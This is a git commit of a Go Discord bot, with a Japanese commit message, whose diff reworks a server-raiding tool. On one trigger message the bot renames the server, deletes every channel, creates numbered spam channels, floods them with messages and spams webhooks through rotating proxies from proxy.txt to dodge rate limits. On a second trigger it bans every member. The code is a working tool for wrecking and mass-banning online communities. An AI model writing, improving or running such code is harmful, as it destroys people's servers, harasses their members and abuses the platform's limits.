b6e2194a87111592aea77c80040c7391dab7c901
!shigure <sigure.dev@gmail.com>
2026-01-12 02:31:32 +0900

    仕様変更、眠いしだるいので一旦放置、起きたら直す

--- main.go
+++ main.go
@@ -1,11 +1,18 @@
+// 今クソめんどくて放置中、そのうち直す
 package main
 
 import (
+	"bufio"
+	"bytes"
 	"encoding/json"
+	"fmt"
 	"net/http"
+	"net/url"
 	"os"
 	"os/signal"
 	"strconv"
+	"strings"
+	"sync/atomic"
 	"syscall"
 	"time"
 
@@ -16,87 +23,132 @@ import (
 type Config struct {
 	Token       string `json:"token"`
 	Trigger     string `json:"trigger"`
-	BanTrigger  string `json:"banTrigger"`
-	ServerName  string `json:"serverName"`
-	WebhookName string `json:"webhookName"`
+	BanTrigger  string `json:"ban_trigger"`
+	ServerName  string `json:"server_name"`
+	WebhookName string `json:"webhook_name"`
 	Setup       struct {
-		ChannelName    string `json:"channelName"`
-		ChannelCount   int    `json:"channelCount"`
-		MessageContent string `json:"messageContent"`
-		MessageCount   int    `json:"messageCount"`
+		ChannelName  string `json:"ch_name"`
+		ChannelCount int    `json:"ch_count"`
+		Content      string `json:"content"`
+		MsgCount     int    `json:"msg_count"`
 	} `json:"setup"`
 }
 
-var config Config
+var (
+	cfg     Config
+	proxies []*http.Client
+	counter uint64
+)
 
 func main() {
-	file, _ := os.ReadFile("config.json")
-	json.Unmarshal(file, &config)
+	b, _ := os.ReadFile("config.json")
+	json.Unmarshal(b, &cfg)
 
-	dg, _ := discordgo.New("Bot " + config.Token)
-	dg.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMessages | discordgo.IntentsGuildMembers
-
-	dg.Client = &http.Client{
-		Transport: &http2.Transport{
-			AllowHTTP:        true,
-			MaxReadFrameSize: 1 << 20,
-		},
-		Timeout: 10 * time.Second,
+	f, _ := os.Open("proxy.txt")
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" {
+			continue
+		}
+		if !strings.HasPrefix(line, "http") {
+			line = "http://" + line
+		}
+		pURL, err := url.Parse(line)
+		if err != nil {
+			continue
+		}
+		proxies = append(proxies, &http.Client{
+			Transport: &http.Transport{Proxy: http.ProxyURL(pURL), MaxIdleConns: 100},
+			Timeout:   5 * time.Second,
+		})
 	}
 
-	dg.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
-		if m.Author.Bot { return }
+	s, _ := discordgo.New("Bot " + cfg.Token)
+	s.Identify.Intents = discordgo.IntentsAll
+	s.Client = &http.Client{
+		Transport: &http2.Transport{AllowHTTP: true},
+		Timeout:   10 * time.Second,
+	}
 
-		if m.Content == config.Trigger {
-			gID := m.GuildID
-			go s.GuildEdit(gID, &discordgo.GuildParams{Name: config.ServerName})
+	s.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
+		if m.Author.Bot || m.GuildID == "" {
+			return
+		}
 
-			chs, _ := s.GuildChannels(gID)
-			for _, ch := range chs {
-				go s.ChannelDelete(ch.ID)
+		if m.Content == cfg.Trigger {
+			g := m.GuildID
+			s.GuildEdit(g, &discordgo.GuildParams{Name: cfg.ServerName})
+
+			chs, _ := s.GuildChannels(g)
+			for _, c := range chs {
+				s.ChannelDelete(c.ID)
 			}
 
-			for i := 1; i <= config.Setup.ChannelCount; i++ {
-				go func(idx int) {
-					cName := config.Setup.ChannelName + "-" + strconv.Itoa(idx)
-					newCh, err := s.GuildChannelCreate(gID, cName, discordgo.ChannelTypeGuildText)
-					if err != nil { return }
+			time.Sleep(3 * time.Second)
 
-					for j := 0; j < config.Setup.MessageCount; j++ {
-						go s.ChannelMessageSend(newCh.ID, config.Setup.MessageContent)
+			for i := 0; i < cfg.Setup.ChannelCount; i++ {
+				name := cfg.Setup.ChannelName + "-" + strconv.Itoa(i)
+				ch, err := s.GuildChannelCreate(g, name, discordgo.ChannelTypeGuildText)
+				if err != nil {
+					time.Sleep(1 * time.Second)
+					continue
+				}
+
+				for j := 0; j < cfg.Setup.MsgCount; j++ {
+					go s.ChannelMessageSend(ch.ID, cfg.Setup.Content)
+				}
+
+				go func(cID string) {
+					w, err := s.WebhookCreate(cID, cfg.WebhookName, "")
+					if err != nil {
+						return
 					}
+					whURL := fmt.Sprintf("https://discord.com/api/webhooks/%s/%s", w.ID, w.Token)
+					payload, _ := json.Marshal(map[string]string{"content": cfg.Setup.Content})
 
-					go func() {
-						wh, err := s.WebhookCreate(newCh.ID, config.WebhookName, "")
-						if err == nil {
-							for k := 0; k < config.Setup.MessageCount; k++ {
-								go s.WebhookExecute(wh.ID, wh.Token, false, &discordgo.WebhookParams{
-									Content: config.Setup.MessageContent,
-								})
+					for k := 0; k < cfg.Setup.MsgCount; k++ {
+						go func() {
+							if len(proxies) == 0 {
+								return
 							}
-						}
-					}()
-				}(i)
+							idx := atomic.AddUint64(&counter, 1) % uint64(len(proxies))
+							proxies[idx].Post(whURL, "application/json", bytes.NewBuffer(payload))
+						}()
+					}
+				}(ch.ID)
+
+				time.Sleep(200 * time.Millisecond)
 			}
 		}
 
-		if m.Content == config.BanTrigger {
-			lastID := ""
+		if m.Content == cfg.BanTrigger {
+			curr := ""
 			for {
-				members, _ := s.GuildMembers(m.GuildID, lastID, 1000)
-				if len(members) == 0 { break }
-				for _, member := range members {
-					if member.User.ID == s.State.User.ID { continue }
-					time.Sleep(10 * time.Millisecond)
-					go s.GuildBanCreateWithReason(m.GuildID, member.User.ID, "Purge", 0)
-					lastID = member.User.ID
+				ms, _ := s.GuildMembers(m.GuildID, curr, 1000)
+				if len(ms) == 0 {
+					break
 				}
-				if len(members) < 1000 { break }
+				for _, mem := range ms {
+					if mem.User.ID == s.State.User.ID {
+						continue
+					}
+					time.Sleep(10 * time.Millisecond)
+					go s.GuildBanCreateWithReason(m.GuildID, mem.User.ID, "out", 0)
+					curr = mem.User.ID
+				}
+				if len(ms) < 1000 {
+					break
+				}
 			}
 		}
 	})
 
-	dg.Open()
+	if err := s.Open(); err != nil {
+		return
+	}
+	fmt.Printf("running\n")
+
 	sc := make(chan os.Signal, 1)
 	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
 	<-sc
